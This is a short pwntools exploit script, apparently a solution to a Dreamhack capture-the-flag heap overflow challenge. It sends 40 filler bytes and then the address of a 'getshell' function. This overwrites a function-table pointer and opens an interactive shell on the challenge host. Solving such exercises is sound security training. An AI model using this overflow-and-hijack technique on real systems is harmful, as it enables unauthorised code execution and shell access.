from pwn import *
elf = ELF('/home/kali/Downloads/dreamhack/basic_heap_overflow/basic_heap_overflow')

#context.arch = 'amd64'
cyberedu = 'host3.dreamhack.games:9288'

ip, port = cyberedu.split(':')
port = int(port)

if args.REMOTE:
    p = remote(ip, port)
else:
    p = elf.process()
    
#gdb.attach(p, gdbscript = '''
#b * 0x80486fc
#c
#''')


getshell = 0x804867B
p.sendline(b"A"*8*5 + p32(getshell))
#8*5 remote, 8*6 local
#overwrite table_funcs address 

p.interactive()
